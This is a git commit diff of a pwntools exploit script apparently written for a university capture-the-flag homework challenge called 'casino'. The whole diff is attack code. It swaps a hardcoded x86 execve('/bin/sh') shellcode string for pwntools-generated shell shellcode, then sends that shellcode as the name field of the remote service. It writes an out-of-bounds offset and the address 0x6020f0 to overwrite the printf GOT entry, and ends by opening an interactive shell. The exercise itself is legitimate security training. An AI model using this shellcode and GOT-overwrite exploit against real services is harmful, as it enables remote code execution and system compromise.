c91c89f97741d7de8a2be590994c6ef06125fccb
Alfons0329 <alfons.cs04@g2.nctu.edu.tw>
2019-11-19 22:23:23 +0800

    Check vulnerability for name

--- Hw0x05/solve.py
+++ Hw0x05/solve.py
@@ -3,30 +3,28 @@ from pwn import *
 
 # shellcode
 context.clear(arch='x86_64')
-# sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
-sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
 
 # random number
 p = process("./gen_num.out")
-numbers = p.recvall().decode().split('\n') # prevent bytes object is required not str error
+numbers = p.recvall().decode().split('\n')
 del numbers[-1]
 p.close()
 
-
 # send
-r = process("./casino")
+# r = process("./casino")
 # elf = ELF("./casino")
-# r = remote('edu-ctf.csie.org', 10172)
-print('sc ', sc)
+r = remote('edu-ctf.csie.org', 10172)
 r.sendlineafter('name: ', sc)
 r.sendlineafter('age: ', '40')
 
-# offset = (elf.got['printf'] - elf.bss['guess'])
-offset = -208
+# offset = (elf.got['printf'] - elf.bss['guess']) and name located at 6020f0
+offset = -160 / 4
 sc_idx = 0
 
 for cnt_try in range(0, 2):
     cnt_num = 0
+    print('round ', cnt_try)
     for i in numbers:
         r_out = 'Chose the number ' + str(cnt_num) + ': '
         r.sendlineafter(r_out, i)
@@ -34,11 +32,13 @@ for cnt_try in range(0, 2):
         cnt_num += 1
 
     r.recvuntil(':no]: ')
-    r.sendline('0')
+    r.sendline('1')
 
-    # r.recvuntil('[1 ~ 6]: ')
-    # r.sendline(str(offset + 1))
-    # r.recvuntil(': ')
+    r.recvuntil('[1 ~ 6]: ')
+    r.sendline(str(offset + 1))
+    print('finished sending offset')
+    r.sendline(p64(0x6020f0))
+    print('finished sending got location')
 
 r.interactive()
 r.close()
